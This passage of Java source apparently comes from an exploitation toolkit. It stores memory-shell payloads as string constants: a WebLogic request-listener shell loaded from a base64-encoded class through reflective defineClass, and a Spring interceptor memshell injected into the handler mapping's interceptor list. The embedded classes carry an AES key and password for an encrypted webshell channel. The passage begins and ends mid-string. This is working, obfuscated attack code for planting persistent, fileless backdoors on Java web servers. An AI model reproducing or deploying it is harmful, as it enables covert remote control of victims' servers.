            "            byte[] var1 = base64Decode(\"yv66vgAAADMBWQoAYACyCQBGALMJAEYAtAgAtQkARgC2CAC3CQBGALgIALkJAEYAugcAuwoACgCyCgAKALwKAAoAvQoARgC+CQBGAL8IAMAJAEYAwQoAYADCCgBgAMMIAMQKAMUAxgcAxwoAMQDICgAWAMkKAMUAygoAxQDLBwDMCADNCgDOAM8KADEA0AoAzgDRBwDSCgDOANMKACAA1AoAIADVCgAxANYIANcKAC4A2AgA2QcA2goALgDbBwDcCgDdAN4KADAA3wgA4AcA4QcAeQcA4gcA4wgA5AoALgDlCADmCADnCADoCADpCADqCgDrAOwHAO0KAEYA7ggA7wsAOgDwCADxCgAxAPILADoA8wsAOgD0CgBGAPUKAEYA9ggA9wsA+AD5BwD6CgAuAPsKAEYAwgoARgD8CwD4AP0IAP4LADoA/QcA/woATQCyCgAwAQALAF4BAQoAMQECCgEDAQQKADAAvQoATQEFCgBGAQYKADEBBwgBCAgBCQoAGwEKCABkCgAuAQsKAQwBDQoBDAEOBwEPCABiBwEQBwERAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMbWVtc2hlbGwvV2VibG9naWNMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+gcBEgcAzAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARMHAO0HAQ8HARQBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAR2YXI1AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAGldlYmxvZ2ljTGlzdGVuZXJTaGVsbC5qYXZhDABsAG0MAGIAYwwAZABlAQAQM2M2ZTBiOGE5YzE1MjI0YQwAZgBnAQAEcEFTMwwAaABnAQAQL2Zhdmljb25kZW1vLmljbwwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMARUBFgwBFwEYDABqAIcMAGoAZwEABVVURi04DABrAGcMAGwAcwwBGQEaAQADQUVTBwESDAEbARwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEdAR4MAGwBHwwBIAEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEkDAEbASUMASYBJwwBKAEpAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASoBHgwAbAErDAEXASwMAS0BGAEAEGphdmEudXRpbC5CYXNlNjQMAS4BLwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATABMQEAE1tMamF2YS9sYW5nL09iamVjdDsHATIMATMBNAwBNQE2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATcBOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyBwETDAE5AToBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACoAKkBABBYLVJlcXVlc3RlZC1XaXRoDAE7AIcBAA5YTUxIVFRQUmVxdWVzdAwBPAE9DAE+AT8MAUAAhwwAlQCWDAB6AHsBABBtZW1zaGVsbC5wYXlsb2FkBwEUDAFBAUIBAB5tZW1zaGVsbC9XZWJsb2dpY0xpc3RlbmVyU2hlbGwMAUMBRAwAdgB3DAFFAUYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAUcBSAwBSQFKDAFLAUwHAU0MAU4BTwwBUAEeDACLAIwMAUsBLAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBUQBtDAFSAVMHAVQMAVUBVgwBVwFYAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Np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\");\n" +
            "            Method var2 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "            var2.setAccessible(true);\n" +
            "            Class clazz = (Class)var2.invoke(var0.getClass().getClassLoader(), var1, 0, var1.length);\n" +
            "            clazz.newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "        }\n" +
            "\n" +
            "        try {\n" +
            "            Field var6 = var0.getClass().getDeclaredField(\"eventsManager\");\n" +
            "            var6.setAccessible(true);\n" +
            "            Object var7 = var6.get(var0);\n" +
            "            Method var3 = var7.getClass().getDeclaredMethod(\"registerEventListener\", String.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            var3.invoke(var7, shellClassName);\n" +
            "        } catch (Exception var4) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while(var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String SpringInterceptorMemShell=
            "import org.springframework.web.context.WebApplicationContext;\n" +
            "import org.springframework.web.context.request.RequestContextHolder;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class SpringInterceptorMemShell {\n" +
            "\n" +
            "    private static Object MEMSHELL_OBJECT;\n" +
            "    private static final String interceptor_name = \"memshell.SpringInterceptorShell\";\n" +
            "\n" +
            "    public SpringInterceptorMemShell() {\n" +
            "        InjectMemClass();\n" +
            "        InjectMem();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void InjectMem() {\n" +
            "        try {\n" +
            "            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            // 从context中获取AbstractHandlerMapping的实例对象\n" +
            "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\");\n" +
            "            // 反射获取adaptedInterceptors属性\n" +
            "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
            "            field.setAccessible(true);\n" +
            "            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);\n" +
            "            // 避免重复添加\n" +
            "            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {\n" +
            "                if (adaptedInterceptors.get(i).getClass().getName().equals(interceptor_name)) {\n" +
            "                    System.out.println(\"已经添加过TestInterceptor实例了\");\n" +
            "                }\n" +
            "            }\n" +
            "            adaptedInterceptors.add(MEMSHELL_OBJECT);  //  添加全局interceptor\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void InjectMemClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(interceptor_name).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBJAoAUwCQCACRCQBSAJIIAJMJAFIAlAgAlQkAUgCWBwCXCgAIAJAKAAgAmAoACACZCgBSAJoJAFIAmwgAnAkAUgCdCACeCgCfAKAHAKEKAC0AogoAEgCjCgCfAKQKAJ8ApQcApggApwoAqACpCgAtAKoKAKgAqwcArAoAqACtCgAcAK4KABwArwoALQCwCACxCgAqALIIALMHALQKACoAtQcAtgoAtwC4CgAsALkIALoHALsHAGgHALwHAL0IAL4KACoAvwgAwAgAwQgAwggAwwgAxAgAxQsAxgDHCADICgAtAMkLAMYAygsAxgDLCgBSAMwKAFIAzQgAzgsAzwDQBwDRCgAqANIKAD8A0woAPwDUCwDPANUIANYLAMYA1QcA1woARgCQCgAsANgLANkA2goALQDbCgDcAN0KACwAmQoARgDeCgBSAN8KAC0A4AgA4QgA4gcA4wcA5AEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMbWVtc2hlbGwvU3ByaW5nSW50ZXJjZXB0b3JTaGVsbDsBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAltCAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDjBwDlBwCmAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAvQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgcA5gEAClNvdXJjZUZpbGUBABtTcHJpbmdJbnRlcmNlcHRvclNoZWxsLmphdmEMAFoAWwEAEDNjNmUwYjhhOWMxNTIyNGEMAFQAVQEABHBBUzMMAFYAVQEAEC9mYXZpY29uZGVtby5pY28MAFcAVQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDADnAOgMAOkA6gwAWABvDABYAFUBAAVVVEYtOAwAWQBVAQADQUVTBwDlDADrAOwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDADtAO4MAFoA7wwA8ADxDADyAPMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwD0DADrAPUMAPYA9wwA+AD5AQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAPoA7gwAWgD7DADpAPwMAP0A6gEAEGphdmEudXRpbC5CYXNlNjQMAP4A/wEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMAQABAQEAE1tMamF2YS9sYW5nL09iamVjdDsHAQIMAQMBBAwBBQEGAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAQcBCAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAQWC1SZXF1ZXN0ZWQtV2l0aAcBCQwBCgBvAQAOWE1MSFRUUFJlcXVlc3QMAQsBDAwBDQEODAEPAG8MAH0AfgwAYQBiAQAQbWVtc2hlbGwucGF5bG9hZAcA5gwBEAERAQAKbWVtc2hlbGwvWAwBEgETDABaARQMARUBFgwBFwEYAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAEZARoHARsMARwBHQwBHgEfBwEgDAEhASIMASMA7gwAcwB0DAEeAPwBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MBAB9tZW1zaGVsbC9TcHJpbmdJbnRlcmNlcHRvclNoZWxsAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0hhbmRsZXJJbnRlcmNlcHRvckFkYXB0ZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5